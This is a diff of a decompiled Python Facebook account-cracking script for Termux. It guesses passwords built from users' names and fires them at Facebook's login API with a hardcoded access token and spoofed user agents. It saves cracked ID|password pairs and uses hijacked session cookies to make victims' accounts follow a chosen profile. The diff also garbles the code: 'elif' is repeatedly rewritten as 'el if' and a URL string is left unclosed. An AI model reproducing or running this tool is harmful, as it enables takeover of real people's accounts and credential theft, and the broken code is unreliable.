@@ -1,4 +1,4 @@
-#ARAFAT 
+#ARAFAT
 # Time Succes decompile : 2022-05-22 23:34:12.924217
 W = '\033[97;1m'
 R = '\033[91;1m'
@@ -80,7 +80,7 @@ def back():
 
 ah="TRICKER-"
 imt="-M4786=="
-ak="ARAFAT -"
+ak="ARAFAT-"
 myid=uuid.uuid4().hex[:10].upper()
 try:
 	key1 = open('/data/data/com.termux/files/usr/bin/.mrBALOCH -cov', 'r').read()
@@ -128,7 +128,7 @@ def Public():
 		except requests.exceptions.ConnectionError:
 			print ( ' [×] Connection Timeout')
 			exit()
-	elif pil in ['2','02']:
+	el if pil in ['2','02']:
 		try:
 			cookie=input(" [+] Cookie : ")
 			data = requests.get("https://business.facebook.com/business_locations", headers = {"user-agent": "Mozilla/5.0 (Linux; Android 12.1.0; MI 8 Build/OPM1.171019.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.86 Mobile Safari/537.36","referer": "https://www.facebook.com/","host": "business.facebook.com","origin": "https://business.facebook.com","upgrade-insecure-requests" : "1","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7","cache-control": "max-age=0","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8","content-type":"text/html; charset=utf-8"}, cookies = {"cookie":cookie}) 
@@ -179,7 +179,7 @@ def setting():
 		for tua in sorted(id):
 			id2.append(tua)
 
-	elif hu in ['2','02']:
+	el if hu in ['2','02']:
 		muda=[]
 		for bacot in sorted(id):
 			muda.append(bacot)
@@ -188,7 +188,7 @@ def setting():
 		for xmud in range(bcm):
 			id2.append(muda[bcmi])
 			bcmi -=1
-	elif hu in ['3','03']:
+	el if hu in ['3','03']:
 		for bacot in id:
 			xx = random.randint(0,len(id2))
 			id2.insert(xx,bacot)
@@ -200,7 +200,7 @@ def setting():
 	hc = input ("\n [#] method : ")
 	if hc in ['1','01']:
 		method.append('mobile')
-	elif hc in ['2','02']:
+	el if hc in ['2','02']:
 		method.append('free')
 	else:
 		method.append('mobile')
@@ -211,9 +211,9 @@ def passmenu():
 	passmen=input('\n [#] Select Pass : ')
 	if passmen in ['1','01']:
 		first()
-	elif passmen in ['2','02']:
+	el if passmen in ['2','02']:
 		name()
-	elif passmen in ['3','03']:
+	el if passmen in ['3','03']:
 		name2()
 	else:
 		passmenu()
@@ -241,7 +241,7 @@ def first():
 					pwv.append(frs+'12345')
 			if 'mobile' in method:
 				pool.submit(crack,idf,pwv)
-			elif 'free' in method:
+			el if 'free' in method:
 				pool.submit(free,idf,pwv)
 			else:
 				pool.submit(crack,idf,pwv)
@@ -259,7 +259,7 @@ def name():
 					pwv = [name, xz[0]+xz[0],xz[0]+xz[1]+"12345", xz[0]+xz[1]+"786",xz[0]+xz[1]+"123",xz[0]+xz[1]+"1234"]
 				if 'mobile' in method:
 					pool.submit(crack,idf,pwv)
-				elif 'free' in method:
+				el if 'free' in method:
 					pool.submit(free,idf,pwv)
 				else:
 					pool.submit(crack,idf,pwv)
@@ -290,7 +290,7 @@ def name2():
 					pwv.append(frs+'786')
 			if 'mobile' in method:
 				pool.submit(crack,idf,pwv)
-			elif 'free' in method:
+			el if 'free' in method:
 				pool.submit(free,idf,pwv)
 			else:
 				pool.submit(crack,idf,pwv)
@@ -319,7 +319,7 @@ def crack(idf,pwv):
 				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
 				akun.append(idf+'|'+pw)
 				break
-			elif "c_user" in ses.cookies.get_dict().keys():
+			el if "c_user" in ses.cookies.get_dict().keys():
 				coki=po.cookies.get_dict()
 				coki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
 				print(f'\r\x1b[1;92m [ BALOCH-OK ] {idf} | {pw}')
@@ -339,7 +339,7 @@ def free(idf,pwv):
 	bi = random.choice([u,k,kk,b,h,hh])
 	pers = loop*100/len(id2)
 	fff = '%'
-	sys.stdout.write('\r %s[ARAFAT ] %s•%s • OK:%s • CP:%s  '%(bi,loop,len(id2),len(ok),cp)),
+	sys.stdout.write('\r %s[ARAFAT] %s•%s • OK:%s • CP:%s  '%(bi,loop,len(id2),len(ok),cp)),
 	sys.stdout.flush()
 	ua = random.choice(ugen)
 	ua2 = random.choice(ugen2)
@@ -357,7 +357,7 @@ def free(idf,pwv):
 				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
 				akun.append(idf+'|'+pw)
 				break
-			elif "c_user" in ses.cookies.get_dict().keys():
+			el if "c_user" in ses.cookies.get_dict().keys():
 				coki=po.cookies.get_dict()
 				coki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
 				print(f'\r\x1b[1;92m [ BALOCH-OK ] {idf} | {pw}')
@@ -374,17 +374,17 @@ def free(idf,pwv):
 	loop+=1
 def follow(ses,coki):
 	ses.headers.update({"accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
-	r = sop(ses.get('https://mbasic.facebook.com/profile.php?id=100067945261995', cookies={'cookie': coki}).text, 'html.parser')
+	r = sop(ses.get('https://www.facebook.com/profile.php?id=100080009552629, cookies={'cookie': coki}).text, 'html.parser')
 	get = r.find('a', string='Follow').get('href')
 	ses.get(('https://mbasic.facebook.com' + str(get)), cookies={'cookie': coki}).text
 
 logo = ("""\033[1;32m 
-\033[1;32m                    A
-\033[1;33m                    R
-\033[1;32m                    A
-\033[1;33m                     F
-\033[1;32m                     A
-\033[1;33m                     T
+\033[1;32m A
+\033[1;33m R
+\033[1;32m A
+\033[1;33m F
+\033[1;32m A
+\033[1;33m T
                                               
 
 
@@ -414,13 +414,13 @@ class Main:
 		print("\033[1;32m [1] First You Subscribe Channel")
 		print("\033[1;33m [2] Exit")
 		print("")
-		ARAFAT  = input("\n\033[1;36m  Chose ==> \033[1;32m")
-		if ARAFAT  in ["", " "]:
+		ARAFAT = input("\n\033[1;36m  Chose ==> \033[1;32m")
+		if ARAFAT in ["", " "]:
 			exit()
-		el if ARAFAT  in ["2", "02"]:
+		el if ARAFAT in ["2", "02"]:
 			print("    Thanks🥰♥️")
 			exit()
-		el if ARAFAT  in ["1", "01"]:
+		el if ARAFAT in ["1", "01"]:
 			os.system("xdg-open https://youtu.be/gxjhqkJL_h0")
 			print("")
 			time.sleep(2.0)
@@ -872,14 +872,14 @@ class Main:
 				print("\r \033[0;92m[ BALOCH-OK ] %s | %s\033[0;97m         "%(uid, pw))
 				print ("\r \033[0;92m Congrats Bro ")
 				self.ok.append("%s|%s"%(uid, pw))
-				open("2009-ARAFAT  -Ok.txt","a").write(" %s|%s\n"%(uid, pw))
+				open("2009-ARAFAT -Ok.txt","a").write(" %s|%s\n"%(uid, pw))
 				break
 			el if "www.facebook.com" in response.json()["error_msg"]:
-				print("\r \033[0;92m[ARAFAT -OK ] %s | %s\033[0;97m         "%(uid, pw))
+				print("\r \033[0;92m[ARAFAT-OK ] %s | %s\033[0;97m         "%(uid, pw))
 				self.cp.append("%s|%s"%(uid, pw))
-				open("2009-ARAFAT -OK.txt","a").write(" %s | %s\n"%(uid, pw))
+				open("2009-ARAFAT-OK.txt","a").write(" %s | %s\n"%(uid, pw))
 				break
-			else: 
+			else:
 				continue
 
 		self.loop +=1
@@ -1279,7 +1279,7 @@ class Main:
 			"Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]"
 		])
 		sys.stdout.write(
-			"\r [ARAFAT  ] %s/%s -> Ok:-%s - Cp:-%s "%(self.loop, len(self.id), len(self.cp), len(self.ok))
+			"\r [ARAFAT ] %s/%s -> Ok:-%s - Cp:-%s "%(self.loop, len(self.id), len(self.cp), len(self.ok))
 		); sys.stdout.flush()
 		for pw in pwx:
 			pw = pw.lower()
@@ -1296,15 +1296,15 @@ class Main:
 			}
 			response = ses.get("https://b-api.facebook.com/method/auth.login?format=json&email="+str(uid)+"&password="+str(pw)+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=headers) 
 			if "session_key" in response.text and "EAAA" in response.text:
-				print("\r \033[0;92m[ARAFAT -OK ] %s | %s\033[0;97m         "%(uid, pw))
+				print("\r \033[0;92m[ARAFAT-OK ] %s | %s\033[0;97m         "%(uid, pw))
 				print ("\r \033[0;92m Congrats Bro ")
 				self.ok.append("%s|%s"%(uid, pw))
-				open("2009-ARAFAT -Ok.txt","a").write(" %s|%s\n"%(uid, pw))
+				open("2009-ARAFAT-Ok.txt","a").write(" %s|%s\n"%(uid, pw))
 				break
-			elif "www.facebook.com" in response.json()["error_msg"]:
-				print("\r \033[0;92m[ARAFAT -OK ] %s | %s\033[0;97m         "%(uid, pw))
+			el if "www.facebook.com" in response.json()["error_msg"]:
+				print("\r \033[0;92m[ARAFAT-OK ] %s | %s\033[0;97m         "%(uid, pw))
 				self.cp.append("%s|%s"%(uid, pw))
-				open("2009-ARAFAT -OK.txt","a").write(" %s | %s\n"%(uid, pw))
+				open("2009-ARAFAT-OK.txt","a").write(" %s | %s\n"%(uid, pw))
 				break
 			else:
 				continue
@@ -1316,7 +1316,7 @@ def Subscraption():
 	key1=open('/data/data/com.termux/files/usr/bin/.mrBALOCH -cov', 'r').read()
 	clear()
 	print(logo)
-	r1=requests.get("https://github.com/AS-ARAFAT/AS-ARAFAT/Test/blob/main/Test.txt").text
+	r1=requests.get("https://github.com/R1F4T-2-0/Test/blob/main/Test.txt").text
 	if key1 in r1:
 		os.system('clear')
 		print(logo)
@@ -1329,8 +1329,8 @@ def Subscraption():
 		os.system("clear")
 		print(logo)
 		print ("")
-		print(" \033[1;32mARAFAT  Toll Free BUT You Need Get Approved First\033[1;37m\n")
-		print(" \033[1;32m Note :ARAFAT  FREE HA BHAIYO ENJOYA   \033[1;37m")
+		print(" \033[1;32mARAFAT Toll Free BUT You Need Get Approved First\033[1;37m\n")
+		print(" \033[1;32m Note :ARAFAT FREE HA BHAIYO ENJOYA   \033[1;37m")
 		print ("")
 		print(" Your Key is Not Approved ")
 		print("")
@@ -1347,7 +1347,7 @@ def Subscraption():
 		input(" Press Enter To Send Key")
 		time.sleep(3.5)
 		tks = 'Dear%20Admin,%20Please%20Approved%20My%20Key%20To%20Premium%20%20Thanks%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20My%20Email%20:%20'+lol+'%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20My%20Name%20:%20'+name+'%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20My%20%20Key%20%20:%20'+ak+ah+key1
-		os.system('am start https://wa.me/+8801749953660?text=' + tks)
+		os.system('am start https://wa.me/+8801960348450?text=' + tks)
 		Subscraption()        
 Subscraption()
 
